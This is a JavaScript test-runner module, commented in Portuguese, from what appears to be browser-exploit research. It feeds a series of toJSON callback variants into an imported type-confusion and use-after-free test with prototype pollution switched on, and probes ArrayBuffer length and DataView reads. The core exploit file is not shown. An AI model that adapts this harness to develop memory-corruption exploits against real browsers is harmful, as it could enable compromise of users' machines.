// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { executeTestWithSpecificToJSON, current_toJSON_call_count } from './testJsonTypeConfusionUAFSpeculative.mjs';
// OOB_CONFIG e toHex não são mais necessários aqui diretamente, pois testJsonTypeConfusionUAFSpeculative os usa internamente.

// --- DEFINIÇÕES DAS VARIANTES da função toJSON ---
const ppKeyForToJSON = 'toJSON'; // Usado internamente se as toJSON precisarem logar o nome da ppKey

// Variante Base (V0): Super Minimalista (como no último teste bem-sucedido)
function toJSON_V0_SuperMinimal() {
    current_toJSON_call_count++;
    // document.title = `V0_SuperMinimal Call ${current_toJSON_call_count}`; // Canary mínimo
    return { payloadV0: true, call: current_toJSON_call_count };
}

// Variante 1: Adiciona logS3 simples
function toJSON_V1_TestLogS3() {
    current_toJSON_call_count++;
    document.title = `V1_TestLogS3 Call ${current_toJSON_call_count}`;
    try {
        logS3(`[toJSON_V1_TestLogS3] Call ${current_toJSON_call_count}, typeof this: ${typeof this}`, "info", "toJSON_V1_INTERNAL");
    } catch (e) { return { error_in_toJSON: "logS3_failed", message: e.message, call: current_toJSON_call_count }; }
    return { payloadV1: true, op: "logS3", call: current_toJSON_call_count };
}

// Variante 2: Adiciona acesso a this.byteLength
function toJSON_V2_TestByteLength() {
    current_toJSON_call_count++;
    document.title = `V2_TestByteLength Call ${current_toJSON_call_count}`;
    let bl = "N/A";
    try {
        bl = this.byteLength;
    } catch (e) { bl = `Erro BL: ${e.message}`; }
    // Não usar logS3 aqui dentro para isolar
    return { payloadV2: true, op: "byteLength", value: String(bl).substring(0,50), call: current_toJSON_call_count };
}

// Variante 3: Adiciona Object.prototype.toString.call(this)
function toJSON_V3_TestToStringCall() {
    current_toJSON_call_count++;
    document.title = `V3_TestToString Call ${current_toJSON_call_count}`;
    let ts = "N/A";
    try {
        ts = Object.prototype.toString.call(this);
    } catch (e) { ts = `Erro TS: ${e.message}`; }
    return { payloadV3: true, op: "toString", value: ts, call: current_toJSON_call_count };
}

// Variante 4: Adiciona new DataView (condicionalmente)
function toJSON_V4_TestDataView() {
    current_toJSON_call_count++;
    document.title = `V4_TestDataView Call ${current_toJSON_call_count}`;
    let dvRead = "N/A";
    try {
        if (this instanceof ArrayBuffer && this.byteLength >= 4) {
            dvRead = new DataView(this, 0, 4).getUint32(0, true);
            dvRead = "0x" + dvRead.toString(16);
        } else {
            dvRead = "Não é AB ou tamanho insuficiente para DV";
        }
    } catch (e) { dvRead = `Erro DV: ${e.message}`; }
    return { payloadV4: true, op: "DataView", value: dvRead, call: current_toJSON_call_count };
}

// Variante 5: Adiciona checagem de typeof this.slice === 'function'
function toJSON_V5_TestSliceCheck() {
    current_toJSON_call_count++;
    document.title = `V5_TestSliceCheck Call ${current_toJSON_call_count}`;
    let se = "N/A";
    try {
        se = (typeof this.slice === 'function');
    } catch (e) { se = `Erro SC: ${e.message}`; }
    return { payloadV5: true, op: "sliceCheck", value: se, call: current_toJSON_call_count };
}


async function runIterativeToJSONIntroduction() {
    const FNAME_RUNNER = "runIterativeToJSONIntroduction";
    logS3(`==== INICIANDO Testes de Reintrodução de Operações na toJSON ====`, 'test', FNAME_RUNNER);

    const testsToRun = [
        { description: "Test_toJSON_V0_SuperMinimal", func: toJSON_V0_SuperMinimal },
        { description: "Test_toJSON_V1_TestLogS3", func: toJSON_V1_TestLogS3 },
        { description: "Test_toJSON_V2_TestByteLength", func: toJSON_V2_TestByteLength },
        { description: "Test_toJSON_V3_TestToStringCall", func: toJSON_V3_TestToStringCall },
        { description: "Test_toJSON_V4_TestDataView", func: toJSON_V4_TestDataView },
        { description: "Test_toJSON_V5_TestSliceCheck", func: toJSON_V5_TestSliceCheck },
    ];

    for (const test of testsToRun) {
        logS3(`\n--- Executando com toJSON Lógica: ${test.description} ---`, 'subtest', FNAME_RUNNER);
        await executeTestWithSpecificToJSON(
            test.description,
            true, // applyPrototypePollution
            test.func
            // Os parâmetros de offset e valor são fixos dentro de executeTestWithSpecificToJSON
        );
        await PAUSE_S3(MEDIUM_PAUSE_S3);
        logS3(`   Título da página ao final de ${test.description}: ${document.title}`, "info");
    }

    logS3(`==== Testes de Reintrodução de Operações na toJSON CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_IterativeToJSONOps';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Reintrodução Iterativa de Ops em toJSON ====`,'test', FNAME);
    document.title = "Iniciando Script 3 - Reintrodução Ops toJSON";
    
    await runIterativeToJSONIntroduction();
    
    logS3(`\n==== Script 3 CONCLUÍDO (Reintrodução Iterativa de Ops em toJSON) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
     if (document.title.startsWith("Iniciando") || document.title.startsWith("CONGELOU?")) {
        // Não sobrescrever título se congelou ou erro no início
    } else {
        document.title = "Script 3 Concluído - Reintrodução Ops toJSON";
    }
}
